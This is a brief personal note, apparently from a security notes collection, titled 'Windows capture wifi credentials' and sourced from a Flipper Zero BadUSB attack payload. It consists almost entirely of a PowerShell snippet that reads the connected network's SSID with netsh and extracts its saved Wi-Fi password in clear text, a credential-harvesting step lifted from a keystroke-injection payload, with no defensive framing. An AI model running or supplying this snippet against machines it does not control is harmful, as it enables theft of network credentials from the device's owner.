---
id: windows-wificredentials
tags: [credentials, windows, wifi, password]
created: 2023-01-12 11:56
---
# windows-wificredentials

backlinks: [[]]

sources:

- <https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-AcidBurn/AcidBurn.ps1>

---

# Windows capture wifi credentials



```powershell
$pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
$pos = $pro.IndexOf(':')
$pro = $pro.Substring($pos+2).Trim()

$pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
$passPOS = $pass.IndexOf(':')
$pass = $pass.Substring($passPOS+2).Trim()

```
